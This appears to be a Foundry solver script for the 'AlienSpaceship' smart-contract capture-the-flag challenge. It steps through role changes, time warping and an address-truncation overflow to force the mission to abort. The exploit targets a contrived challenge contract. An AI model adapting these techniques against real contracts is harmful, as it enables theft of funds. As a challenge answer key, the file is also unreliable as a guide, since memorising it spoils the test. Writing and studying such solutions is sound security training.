// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-ctf/CTFSolver.sol";
import "forge-std/console.sol";

import {Challenge} from "src/Challenge.sol";
import {AbortHero} from "src/AbortHero.sol";

interface AlienSpaceship {
    function missionAborted() external view returns (bool);

    // Decoded function signatures

    // VIEW
    function roles(address) external view returns (uint256, uint256, bool);
    function payloadMass() external view returns (uint256);
    function position() external view returns (uint256, uint256, uint256);
    function distance() external view returns (uint256);
    function numArea51Visits() external view returns (uint256);
    function wormholesEnabled() external view returns (bool);

    // MODIFIERS
    function applyForJob(bytes32) external;
    function applyForPromotion(bytes32) external;
    function runExperiment(bytes calldata) external;
    function quitJob() external;
    function visitArea51(address) external;
    function dumpPayload(uint256) external;
    function enableWormholes() external;
    function jumpThroughWormhole(int256, int256, int256) external;
    function abortMission() external;
}

contract AlienSpaceshipSolver is CTFSolver {
    Challenge private challenge;
    AlienSpaceship private alienSpaceship;
    AbortHero private abortHero;

    address private system;
    address private player;

    bytes private constant ENGINEER = abi.encode(0x56a2da3687a5982774df44639b06a410da311ff14844c2f7ff0cab50d681571c);
    bytes private constant PHYSICIST = abi.encode(0xb5b6b705a01c9fbc2f5b52325436afd32f5988596d999716ad1711063539b564);
    bytes private constant CAPTAIN = abi.encode(0x3a1665efe60dbe93a7cdcf728baddc0d7ebafe407d444d0de3ed20e1e52a6a0d);
    bytes private constant BLOCKCHAIN_SECURITY_RESEARCHER =
        abi.encode(0x720a004d39b816addddcfa184666132ae9e307670a4e534d64e0af23c84ee0e1);

    function solve(address _challenge, address _player) internal override {
        challenge = Challenge(_challenge);
        alienSpaceship = AlienSpaceship(address(challenge.ALIENSPACESHIP()));
        player = _player;
        _exploit();
    }

    function _exploit() private {
        alienSpaceship.applyForJob(bytes32(ENGINEER));
        alienSpaceship.dumpPayload(4499 ether);
        alienSpaceship.runExperiment(abi.encodeWithSelector(0xa15184c7, bytes32(ENGINEER)));

        abortHero = new AbortHero(address(alienSpaceship));

        alienSpaceship.quitJob();
        alienSpaceship.applyForJob(bytes32(PHYSICIST));
        alienSpaceship.enableWormholes();
        vm.warp(block.timestamp + 12);
        alienSpaceship.applyForPromotion(bytes32(CAPTAIN));

        // 0x10000000000000000000000000000000000000033
        uint256 magicNumber = 1461501637330902918203684832716283019655932543027;
        uint256 payload = magicNumber - uint160(player);
        alienSpaceship.visitArea51(address(uint160(payload)));

        alienSpaceship.jumpThroughWormhole(10 ** 23, 0, 1);
        alienSpaceship.quitJob();
        alienSpaceship.applyForJob(bytes32(ENGINEER));
        alienSpaceship.dumpPayload(501 ether);
        abortHero.abortMission();
    }
}
